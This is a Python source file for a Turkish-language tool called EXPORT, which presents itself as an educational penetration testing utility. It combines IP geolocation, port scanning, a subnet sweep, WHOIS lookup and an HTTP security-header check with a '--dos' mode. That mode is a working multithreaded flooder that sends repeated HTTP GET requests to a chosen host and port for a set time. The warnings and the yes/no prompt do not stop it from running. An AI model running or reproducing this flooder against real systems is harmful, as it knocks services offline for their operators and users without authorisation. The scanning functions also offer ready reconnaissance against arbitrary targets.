#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPORT - Ethical eXploitation and Penetration Testing Tool
🔒 Eğitim Amaçlı Etik Sızma Testi Aracı
"""

import socket
import requests
import argparse
import sys
import os
import threading
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor

def banner():
    print("""
    ╔══════════════════════════════════════════════════╗
    ║                  EXPORT v1.0                     ║
    ║      Ethical eXploitation & Penetration Tool     ║
    ╚══════════════════════════════════════════════════╝
    """)

# 1. KOMUT: GENEL TARAMA (-g)
def genel_tarama(ip):
    print(f"\n[EXPORT] 🔍 GENEL TARAMA: {ip}")
    print("═" * 50)
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        geo = response.json()
        if geo.get('status') == 'success':
            print(f"📍 Ülke: {geo.get('country', 'Bilinmiyor')}")
            print(f"🏙️ Şehir: {geo.get('city', 'Bilinmiyor')}")
            print(f"📡 ISP: {geo.get('isp', 'Bilinmiyor')}")
            print(f"🌐 Organizasyon: {geo.get('org', 'Bilinmiyor')}")
        else:
            print("[EXPORT] ❌ Konum bilgisi alınamadı")
    except Exception as e:
        print(f"[EXPORT] ❌ Konum hatası: {e}")

    print(f"\n[EXPORT] 🚀 Port taraması başlıyor...")
    
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017]
    acik_portlar = []
    
    def check_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "Bilinmeyen"
                    print(f"[EXPORT] ✅ Port {port}/tcp AÇIK → {service}")
                    acik_portlar.append(port)
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_port, ports)
    
    if acik_portlar:
        print(f"\n[EXPORT] 📊 AÇIK PORTLAR: {', '.join(map(str, sorted(acik_portlar)))}")
    else:
        print("\n[EXPORT] ❌ Hiçbir port açık değil")

# 2. KOMUT: AĞ KEŞFİ (-a)
def ag_kesfi(hedef_ip):
    print(f"\n[EXPORT] 🌐 AĞ KEŞFİ: {hedef_ip}")
    print("═" * 50)
    
    try:
        print("[EXPORT] 🔍 Yerel ağdaki cihazlar taranıyor...")
        
        ip_parts = hedef_ip.split('.')
        ag_tarama = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
        
        print(f"[EXPORT] 📡 Tarama aralığı: {ag_tarama}")
        
        try:
            result = subprocess.run(['nmap', '-sn', ag_tarama], 
                                  capture_output=True, text=True, timeout=120)
            print("[EXPORT] 📋 Ağdaki aktif cihazlar:")
            print(result.stdout)
        except:
            print("[EXPORT] ℹ️ Nmap bulunamadı, basit ping taraması yapılıyor...")
            for i in range(1, 255):
                ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
                if ip != hedef_ip:
                    response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
                    if response == 0:
                        print(f"[EXPORT] ✅ {ip} - Aktif")
                        
    except Exception as e:
        print(f"[EXPORT] ❌ Ağ keşfi hatası: {e}")

# 3. KOMUT: DETAYLI BİLGİ (-d)
def detayli_bilgi(hedef):
    print(f"\n[EXPORT] 📊 DETAYLI BİLGİ: {hedef}")
    print("═" * 50)
    
    try:
        print("[EXPORT] 🔍 İnternet veritabanları taranıyor...")
        
        try:
            whois_result = subprocess.run(['whois', hedef], 
                                        capture_output=True, text=True, timeout=30)
            print("[EXPORT] 🌐 WHOIS Bilgileri:")
            print(whois_result.stdout[:500] + "...")
        except:
            print("[EXPORT] ❌ WHOIS bilgisi alınamadı")
        
    except Exception as e:
        print(f"[EXPORT] ❌ Detaylı bilgi hatası: {e}")

# 4. KOMUT: GÜVENLİK TESTİ (-s)
def guvenlik_testi(hedef):
    print(f"\n[EXPORT] 🛡️ GÜVENLİK TESTİ: {hedef}")
    print("═" * 50)
    print("⚠️ UYARI: Bu işlem sadece eğitim amaçlıdır!")
    
    try:
        print("[EXPORT] 🔍 Güvenlik açıkları taranıyor...")
        
        try:
            response = requests.get(f"http://{hedef}", timeout=10)
            security_headers = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
                              'Strict-Transport-Security', 'Content-Security-Policy']
            
            print("[EXPORT] 📋 HTTP Güvenlik Headers:")
            for header in security_headers:
                if header in response.headers:
                    print(f"✅ {header}: {response.headers[header]}")
                else:
                    print(f"❌ {header}: Eksik")
                    
        except:
            print("[EXPORT] ❌ HTTP headers alınamadı")
        
        guvenlik_portlari = [22, 23, 21, 3389]
        print(f"\n[EXPORT] 🔓 Güvenlik açısı riskli portlar:")
        
        for port in guvenlik_portlari:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((hedef, port)) == 0:
                        print(f"⚠️ RİSKLİ: Port {port} açık!")
            except:
                pass
                
    except Exception as e:
        print(f"[EXPORT] ❌ Güvenlik testi hatası: {e}")

# 5. KOMUT: GERÇEK DOS SALDIRISI (--dos)
def dos_saldirisi(hedef, port=80, sure=10):
    print(f"\n[EXPORT] 💥 GERÇEK DOS SALDIRISI: {hedef}:{port}")
    print("═" * 60)
    print("🚨 UYARI: Bu işlem SADECE kendi test ortamınızda kullanılmalıdır!")
    print("🚨 Başkasına karşı kullanmak YASAL SUÇTUR!")
    print("🚨 Mas hiçbir sorumluluk kabul etmez.")
    print("═" * 60)
    
    onay = input("[EXPORT] ❓ Gerçek DoS saldırısını başlatmak istiyor musunuz? (E/H): ")
    if onay.lower() != 'e':
        print("[EXPORT] ❌ İşlem iptal edildi")
        return

    print(f"[EXPORT] ⚡ {sure} saniyelik saldırı başlatılıyor...")

    paket_sayisi = 0

    def attack():
        nonlocal paket_sayisi
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((hedef, port))
                s.sendall(("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(hedef)).encode())
                paket_sayisi += 1
                s.close()
            except:
                pass

    threads = []
    for i in range(50):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    time.sleep(sure)
    print(f"[EXPORT] ✅ Saldırı tamamlandı. Toplam paket: {paket_sayisi}")

if __name__ == "__main__":
    banner()
    
    parser = argparse.ArgumentParser(description="EXPORT - Gelişmiş Güvenlik Tarama Aracı")
    
    parser.add_argument("-g", "--genel", help="Genel IP taraması yapar")
    parser.add_argument("-a", "--ag", help="Ağ keşfi ve cihaz taraması")
    parser.add_argument("-d", "--detay", help="Detaylı bilgi toplama")
    parser.add_argument("-s", "--guvenlik", help="Güvenlik testi yapar")
    parser.add_argument("--dos", help="GERÇEK DOS saldırısı (DİKKAT!)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port numarası (varsayılan: 80)")
    parser.add_argument("-t", "--time", type=int, default=10, help="Süre (saniye) (varsayılan: 10)")
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    if args.genel:
        genel_tarama(args.genel)
    
    if args.ag:
        ag_kesfi(args.ag)
    
    if args.detay:
        detayli_bilgi(args.detay)
    
    if args.guvenlik:
        guvenlik_testi(args.guvenlik)
    
    if args.dos:
        dos_saldirisi(args.dos, args.port, args.time)

    print(f"\n[EXPORT] 🎉 İşlem tamamlandı! - {time.strftime('%Y-%m-%d %H:%M:%S')}")
